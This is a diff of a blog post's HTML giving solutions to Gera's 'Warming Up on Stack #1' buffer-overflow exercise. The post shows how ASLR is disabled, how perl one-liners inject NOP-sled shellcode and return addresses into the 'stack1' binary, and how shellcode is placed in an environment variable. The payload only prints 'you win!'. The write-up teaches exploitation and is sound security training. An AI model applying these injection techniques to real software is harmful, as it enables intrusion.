+* System-wide ASLR <span class="o">(</span>kernel.randomize_va_space<span class="o">)</span>: On <span class="o">(</span>Setting: <span class="m">2</span><span class="o">)</span>
 
   Description - Make the addresses of mmap base, heap, stack and VDSO page randomized.
   This, among other things, implies that shared libraries will be loaded to random
@@ -822,20 +723,20 @@ systems it stores a value of 1 by default to indicate the presence of
 vanilla <code>ASLR</code>. Modifying this file with a value of 0 will immediately
 turn off this feature for all newly spawned processes:</p>
 
-<div class="codehilite"><pre><code><span class="c"># cat /proc/sys/kernel/randomize_va_space</span>
-2
-<span class="c">#</span>
-<span class="c"># echo 0 &gt; /proc/sys/kernel/randomize_va_space</span>
-<span class="c">#</span>
-<span class="c"># ./stack1</span>
+<div class="codehilite"><pre><span></span><code><span class="c1"># cat /proc/sys/kernel/randomize_va_space</span>
+<span class="m">2</span>
+<span class="c1">#</span>
+<span class="c1"># echo 0 &gt; /proc/sys/kernel/randomize_va_space</span>
+<span class="c1">#</span>
+<span class="c1"># ./stack1</span>
 buf: bffff4d4 cookie: bffff524
 AAAA
-<span class="c">#</span>
-<span class="c"># ./stack1</span>
+<span class="c1">#</span>
+<span class="c1"># ./stack1</span>
 buf: bffff4d4 cookie: bffff524
 AAAA
-<span class="c">#</span>
-<span class="c"># ./stack1</span>
+<span class="c1">#</span>
+<span class="c1"># ./stack1</span>
 buf: bffff4d4 cookie: bffff524
 AAAA
 </code></pre></div>
@@ -854,11 +755,11 @@ command-line to inject our shellcode at the location where this correct
 address could be overwritten. However, we were not able to get the
 shellcode executed:</p>
 
-<div class="codehilite"><pre><code>./stack1
+<div class="codehilite"><pre><span></span><code>./stack1
 buf: bffff4d4 cookie: bffff524
 AAAA
-<span class="c">#</span>
-<span class="c"># perl -e &#39;print &quot;\x90&quot;x50 . &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a&quot; . &quot;\xd4\xf4\xff\xbf&quot;&#39; | ./stack1</span>
+<span class="c1">#</span>
+<span class="c1"># perl -e &#39;print &quot;\x90&quot;x50 . &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a&quot; . &quot;\xd4\xf4\xff\xbf&quot;&#39; | ./stack1</span>
 buf: bffff4d4 cookie: bffff524
 </code></pre></div>
 
@@ -869,11 +770,11 @@ What could have gone wrong? A GDB analysis could help but this specific
 issue could be debugged without using it. Have a look at the shellcode
 once again:</p>
 
-<div class="codehilite"><pre><code><span class="c"># hexdump -C shellcode.bin</span>
+<div class="codehilite"><pre><span></span><code><span class="c1"># hexdump -C shellcode.bin</span>
 <span class="m">00000000</span>  eb <span class="m">16</span> <span class="m">31</span> c0 <span class="m">31</span> db <span class="m">31</span> d2  b0 <span class="m">04</span> b3 <span class="m">01</span> <span class="m">59</span> b2 <span class="m">09</span> <span class="nb">cd</span>  <span class="p">|</span>..1.1.1.....Y...<span class="p">|</span>
-<span class="m">00000010</span>  <span class="m">80</span> <span class="m">31</span> c0 <span class="m">40</span> <span class="m">31</span> db <span class="nb">cd </span><span class="m">80</span>  e8 e5 ff ff ff <span class="m">79</span> 6f <span class="m">75</span>  <span class="p">|</span>.1.@1........you<span class="p">|</span>
+<span class="m">00000010</span>  <span class="m">80</span> <span class="m">31</span> c0 <span class="m">40</span> <span class="m">31</span> db <span class="nb">cd</span> <span class="m">80</span>  e8 e5 ff ff ff <span class="m">79</span> 6f <span class="m">75</span>  <span class="p">|</span>.1.@1........you<span class="p">|</span>
 <span class="m">00000020</span>  <span class="m">20</span> <span class="m">77</span> <span class="m">69</span> 6e <span class="m">21</span> 0a                                 <span class="p">|</span> win!.<span class="p">|</span>
-00000026
+<span class="m">00000026</span>
 </code></pre></div>
 
 <p>The shellcode above is copied into the <code>buf</code> array through the <code>gets</code>
@@ -890,10 +791,10 @@ shellcode that has the message with no newline character. However, a
 quick hack can be to remove the newline from the exploit command-line
 and test it:</p>
 
-<div class="codehilite"><pre><code><span class="c"># perl -e &#39;print &quot;\x90&quot;x50 . &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a&quot; . &quot;\xd4\xf4\xff\xbf&quot;&#39; | ./stack1</span>
+<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;print &quot;\x90&quot;x50 . &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a&quot; . &quot;\xd4\xf4\xff\xbf&quot;&#39; | ./stack1</span>
 buf: bffff4d4 cookie: bffff524
-<span class="c">#</span>
-<span class="c"># perl -e &#39;print &quot;\x90&quot;x51 . &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21&quot; . &quot;\xd4\xf4\xff\xbf&quot;&#39; | ./stack1</span>
+<span class="c1">#</span>
+<span class="c1"># perl -e &#39;print &quot;\x90&quot;x51 . &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21&quot; . &quot;\xd4\xf4\xff\xbf&quot;&#39; | ./stack1</span>
 buf: bffff4d4 cookie: bffff524
 you win!
 </code></pre></div>
@@ -972,18 +873,18 @@ shellcode. If you have any queries regarding environment variable based
 exploitation, please refer <strong>section 0x331 Using the Environment</strong> from
 <a href="https://www.nostarch.com/hacking2.htm">Hacking - The Art of Exploitation</a> book:</p>
 
-<div class="codehilite"><pre><code><span class="c"># export WINCODE=$(cat shellcode.bin)</span>
-<span class="c">#</span>
-<span class="c"># echo $WINCODE | hexdump -C</span>
+<div class="codehilite"><pre><span></span><code><span class="c1"># export WINCODE=$(cat shellcode.bin)</span>
+<span class="c1">#</span>
+<span class="c1"># echo $WINCODE | hexdump -C</span>
 <span class="m">00000000</span>  eb <span class="m">16</span> <span class="m">31</span> c0 <span class="m">31</span> db <span class="m">31</span> d2  b0 <span class="m">04</span> b3 <span class="m">01</span> <span class="m">59</span> b2 <span class="m">20</span> <span class="nb">cd</span>  <span class="p">|</span>..1.1.1.....Y. .<span class="p">|</span>
-<span class="m">00000010</span>  <span class="m">80</span> <span class="m">31</span> c0 <span class="m">40</span> <span class="m">31</span> db <span class="nb">cd </span><span class="m">80</span>  e8 e5 ff ff ff <span class="m">79</span> 6f <span class="m">75</span>  <span class="p">|</span>.1.@1........you<span class="p">|</span>
+<span class="m">00000010</span>  <span class="m">80</span> <span class="m">31</span> c0 <span class="m">40</span> <span class="m">31</span> db <span class="nb">cd</span> <span class="m">80</span>  e8 e5 ff ff ff <span class="m">79</span> 6f <span class="m">75</span>  <span class="p">|</span>.1.@1........you<span class="p">|</span>
 <span class="m">00000020</span>  <span class="m">20</span> <span class="m">77</span> <span class="m">69</span> 6e <span class="m">21</span> 0a                                 <span class="p">|</span> win!.<span class="p">|</span>
-00000026
-<span class="c">#</span>
-<span class="c"># ./getenv WINCODE</span>
+<span class="m">00000026</span>
+<span class="c1">#</span>
+<span class="c1"># ./getenv WINCODE</span>
 <span class="o">[</span>+<span class="o">]</span> WINCODE: 0xbffff718
-<span class="c">#</span>
-<span class="c"># perl -e &#39;printf &quot;A&quot;x88 . &quot;\x18\xf7\xff\xbf&quot;&#39; | ./stack1</span>
+<span class="c1">#</span>
+<span class="c1"># perl -e &#39;printf &quot;A&quot;x88 . &quot;\x18\xf7\xff\xbf&quot;&#39; | ./stack1</span>
 buf: bffff4d4 cookie: bffff524
 you win!#
 </code></pre></div>
@@ -993,9 +894,9 @@ environment variable. And it did work! However the output is not exactly
 what we had expected. There&#8217;s no newline at the end. Here is what
 hexdump has to say about our exploit:</p>
 
-<div class="codehilite"><pre><code><span class="c"># perl -e &#39;printf &quot;A&quot;x88 . &quot;\x18\xf7\xff\xbf&quot;&#39; | ./stack1 | hexdump -C</span>
+<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;printf &quot;A&quot;x88 . &quot;\x18\xf7\xff\xbf&quot;&#39; | ./stack1 | hexdump -C</span>
 <span class="m">00000000</span>  <span class="m">79</span> 6f <span class="m">75</span> <span class="m">20</span> <span class="m">77</span> <span class="m">69</span> 6e <span class="m">21</span>  <span class="m">00</span>                       <span class="p">|</span>you win!.<span class="p">|</span>
-00000009
+<span class="m">00000009</span>
 </code></pre></div>
 
 <p>Although the environment variable has a newline at the end, it is not
@@ -1003,16 +904,16 @@ echoed back when the shellcode executes. I made a small change to the
 original shellcode to include <code>0x0a</code> and <code>0x0d</code> characters and used it for
 testing:</p>
 
-<div class="codehilite"><pre><code><span class="c"># perl -e &#39;print &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a\x0d&quot;&#39; &gt;shellcode.bin</span>
-<span class="c">#</span>
-<span class="c"># export WINCODE=$(cat shellcode.bin)# echo $WINCODE | hexdump -C 00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 20 cd  |..1.1.1.....Y. .|</span>
-<span class="m">00000010</span>  <span class="m">80</span> <span class="m">31</span> c0 <span class="m">40</span> <span class="m">31</span> db <span class="nb">cd </span><span class="m">80</span>  e8 e5 ff ff ff <span class="m">79</span> 6f <span class="m">75</span>  <span class="p">|</span>.1.@1........you<span class="p">|</span>
+<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;print &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a\x0d&quot;&#39; &gt;shellcode.bin</span>
+<span class="c1">#</span>
+<span class="c1"># export WINCODE=$(cat shellcode.bin)# echo $WINCODE | hexdump -C 00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 20 cd  |..1.1.1.....Y. .|</span>
+<span class="m">00000010</span>  <span class="m">80</span> <span class="m">31</span> c0 <span class="m">40</span> <span class="m">31</span> db <span class="nb">cd</span> <span class="m">80</span>  e8 e5 ff ff ff <span class="m">79</span> 6f <span class="m">75</span>  <span class="p">|</span>.1.@1........you<span class="p">|</span>
 <span class="m">00000020</span>  <span class="m">20</span> <span class="m">77</span> <span class="m">69</span> 6e <span class="m">21</span> <span class="m">20</span> 0d 0a                           <span class="p">|</span> win! ..<span class="p">|</span>
-00000028
-<span class="c">#</span>
-<span class="c"># ./getenv WINCODE[+] WINCODE: 0xbffff716</span>
-<span class="c">#</span>
-<span class="c"># perl -e &#39;printf &quot;A&quot;x88 . &quot;\x16\xf7\xff\xbf&quot;&#39; | ./stack1</span>
+<span class="m">00000028</span>
+<span class="c1">#</span>
+<span class="c1"># ./getenv WINCODE[+] WINCODE: 0xbffff716</span>
+<span class="c1">#</span>
+<span class="c1"># perl -e &#39;printf &quot;A&quot;x88 . &quot;\x16\xf7\xff\xbf&quot;&#39; | ./stack1</span>
 buf: bffff4d4 cookie: bffff524
 you win!
 </code></pre></div>
@@ -1032,144 +933,31 @@ understanding how exploits worked before mitigation features were
 introduced.</p>
 
         </div>
-        <div class="post-bottomline">
+        <div class="meta">
           <hr/>
-          <p>For comments, questions and suggestions use <a href="https://twitter.com/7h3rAm" target="_blank"><i class="fa fa-twitter"></i></a> or create an <a href="https://github.com/7h3rAm/7h3rAm.github.io/issues/new" target="_blank"><i class="fa fa-exclamation-circle"></i> issue</a> on blog reporsitory.</p>
+          <p>For comments, questions and suggestions use <a href="https://twitter.com/7h3rAm" target="_blank">twitter</a> or create an <a href="https://github.com/7h3rAm/7h3rAm.github.io/issues/new" target="_blank">issue</a> on blog repository.</p>
           <hr/>
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-              
-                
-                
-              
-              
-                
-                
-              
-              <table>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <table>
                 <tr>
-                  <td align="left">(share via <a href="mailto:?subject=Gera's Warming Up on Stack #1 - Solutions&body=/2012/geras-wuos-stack1-solutions.html" target="_blank" title="Share via Email"><i class="fa fa-inbox"></i></a> <a href="http://twitter.com/intent/tweet?text=Gera's Warming Up on Stack #1 - Solutions+/2012/geras-wuos-stack1-solutions.html&via=7h3rAm" target="_blank" title="Share on Twitter"><i class="fa fa-twitter"></i></a> <a href="http://www.facebook.com/sharer/sharer.php?s=100&p[url]=/2012/geras-wuos-stack1-solutions.html&p[images][0]=&p[title]=Gera's Warming Up on Stack #1 - Solutions&p[summary]=Solutions for Gera's Warming up on Stack #1 program." target="_blank" title="Share on Facebook"><i class="fa fa-facebook"></i></a> <a href="https://plus.google.com/share?url=/2012/geras-wuos-stack1-solutions.html" target="_blank" title="Share on Google Plus"><i class="fa fa-google-plus"></i></a>)</td>
-                  <td align="right">(tagged <a href=/tags.html#exploit>exploit</a>, <a href=/tags.html#mitigations>mitigations</a>, <a href=/tags.html#buffer_overflow>buffer_overflow</a> and <a href=/tags.html#writeups>writeups</a>)</td>
+                  <td align="left">(share via <a href="mailto:?subject=Gera's Warming Up on Stack #1 - Solutions&body=http://7h3ram.github.io//2012/geras-wuos-stack1-solutions.html" target="_blank" title="Share via Email">mail</a>, <a href="http://twitter.com/intent/tweet?text=Gera's Warming Up on Stack #1 - Solutions+http://7h3ram.github.io//2012/geras-wuos-stack1-solutions.html&via=7h3rAm" target="_blank" title="Share on Twitter">twitter</a>, <a href="http://www.facebook.com/sharer/sharer.php?s=100&p[url]=http://7h3ram.github.io//2012/geras-wuos-stack1-solutions.html&p[images][0]=&p[title]=Gera's Warming Up on Stack #1 - Solutions&p[summary]=Solutions for Gera's Warming up on Stack #1 program." target="_blank" title="Share on Facebook">facebook</a> or <a href="https://plus.google.com/share?url=http://7h3ram.github.io//2012/geras-wuos-stack1-solutions.html" target="_blank" title="Share on Google Plus">google-plus</a>)</td>
+                  <td align="right">(tagged <a href=/tags.html#buffer_overflow>buffer_overflow</a>, <a href=/tags.html#exploit>exploit</a>, <a href=/tags.html#mitigations>mitigations</a> and <a href=/tags.html#writeups>writeups</a>)</td>
                 </tr>
                 <tr>
-                  
-                    <td align="left"><a href="/2012/exploit-mitigation-techniques-on-linux.html"><i class="fa fa-angle-double-left"></i> Exploit Mitigation Techniques on Linux Systems <i class="fa fa-angle-double-left"></i></a></td>
-                    <td align="right"><a href="/2012/word-list-builder-dic-file-parsing-seh.html"><i class="fa fa-angle-double-right"></i> Word List Builder .dic File Parsing SEH Overflow <i class="fa fa-angle-double-right"></i></a></td>
-                  
-                </tr>
+                                      <td align="left"><a href="/2012/exploit-mitigation-techniques-on-linux.html">&lt;&lt; Exploit Mitigation Techniques on Linux Systems &lt;&lt;</a></td>
+                    <td align="right"><a href="/2012/word-list-builder-dic-file-parsing-seh.html">&gt;&gt; Word List Builder .dic File Parsing SEH Overflow &gt;&gt;</a></td>
+                                  </tr>
               </table>
-            
-          
-            
-          
-          </div>
+                                                      </div>
         </div>
       </div>
     </div>
   </div>
-
-  <div class="row">
-    <div class="col-lg-12">
-      <div class="panel panel-default">
-        <div class="panel-heading post-title">
-          Related Posts
-        </div>
-        <div class="panel-body">
-          
-            1. <a href="/2012/millenium-mpf-seh.html">Millennium MP3 Studio .mpf File Parsing SEH Overflow</a>
-            <div class="overview-date">September 2, 2012</div>
-            <br/>
-          
-            2. <a href="/2013/geras-wuos-stack3-solutions.html">Gera's Warming Up on Stack #3 - Solutions</a>
-            <div class="overview-date">January 3, 2013</div>
-            <br/>
-          
-            3. <a href="/2013/geras-wuos-stack5-solutions.html">Gera's Warming Up on Stack #5 - Solutions</a>
-            <div class="overview-date">January 5, 2013</div>
-            <br/>
-          
-        </div>
-      </div>
-    </div>
-  </div>
-
   </article>
-
-    </section>
-    <footer class="footer">
-      <b><a href="/">Ankur Tyagi</a></b> (<b><a href="https://twitter.com/7h3rAm" target="_blank"><i class="fa fa-at"></i>7h3rAm</a></b>)
-      <br/>
-      Last updated on October 20, 2016 (<b><a href="/rss.xml"><i class="fa fa-rss"></i> rss</a></b> <b><a href="/sitemap.xml"><i class="fa fa-sitemap"></i> sitemap</a></b>)
-      <br/>
-      Published under <b><a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank">by-nc-sa</a></b> and powered by <b><a alt="Linux" href="https://www.kernel.org/" target="_blank"><i class="fa fa-linux"></i></a></b>, <b><a alt="Kalpi" href="https://github.com/7h3rAm/kalpi/" target="_blank">kalpi</a></b>, <b><a href="http://git-scm.com/" target="_blank"><i class="fa fa-git"></i></a></b> and <b><a href="https://github.com/7h3rAm/7h3ram.github.io" target="_blank"><i class="fa fa-github"></i></a></b>
-    </footer>
-
-    <script src="/static/js/bootstrap/bootstrap.3.3.6.min.js"></script>
-    <script src="/static/js/raphael/raphael-min.js"></script>
-    <script src="/static/js/morrisjs/morris.min.js"></script>
-    <script src="/static/files/chart-data.js"></script>
-    <script src="/static/js/sprintf/sprintf.js"></script>
-    <script src="/static/js/underscore/underscore-min.js"></script>
-
+              <div class="footer">
+          <center>
+            <a href="/rss.xml" target="_blank">rss</a> | <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank">license</a>
+          </center>
+        </div>
+          </section>
   </body>
 </html>
